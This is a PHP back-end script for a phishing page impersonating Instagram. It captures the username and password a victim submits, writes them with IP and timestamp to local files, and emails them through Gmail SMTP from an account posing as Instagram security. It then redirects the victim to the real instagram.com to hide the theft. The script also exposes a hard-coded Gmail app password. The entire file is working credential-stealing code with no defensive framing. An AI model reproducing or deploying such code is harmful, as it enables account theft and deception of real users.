<?php
// Get credentials from the form
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');

// Create the log message
$log = "=== NEW LOGIN ATTEMPT ===\n";
$log .= "Username: $username\n";
$log .= "Password: $password\n";
$log .= "IP: $ip\n";
$log .= "Time: $timestamp\n";
$log .= "========================\n\n";

// Save to file
if (!is_dir('auth')) {
    mkdir('auth', 0777, true);
}
file_put_contents('auth/credentials.txt', $log, FILE_APPEND);
file_put_contents('usernames.txt', "Username: $username | Pass: $password | IP: $ip | Time: $timestamp\n", FILE_APPEND);

// Log to Render
error_log($log);

// ========================================
// SEND EMAIL VIA GMAIL SMTP (PHPMailer)
// ========================================

// Load Composer autoloader – now inside the container
require_once __DIR__ . '/vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// YOUR GMAIL SETTINGS
$from_email = "donotreply.instagramsecurity@gmail.com";      // <-- Your Gmail address
$app_password = "oqbs usyn ilxw fezu";   // <-- Gmail App Password (not your regular password)
$to_email = "donotreply.instagramsecurity@gmail.com";        // <-- Where to send (same or different)

$mail = new PHPMailer(true);

try {
    // Server settings
    $mail->SMTPDebug = SMTP::DEBUG_OFF;
    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = $from_email;
    $mail->Password   = $app_password;
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
    $mail->Port       = 465;

    // Recipients
    $mail->setFrom($from_email, 'Instagram Logger');
    $mail->addAddress($to_email);

    // Content
    $mail->Subject = '🔐 New Instagram Login Attempt';
    $mail->Body    = $log;

    $mail->send();
    error_log("✅ Email sent successfully to $to_email");
} catch (Exception $e) {
    error_log("❌ Email could not be sent. Error: {$mail->ErrorInfo}");
}

// ========================================
// REDIRECT TO INSTAGRAM.COM
// ========================================
header('Location: https://instagram.com');
exit();
?>
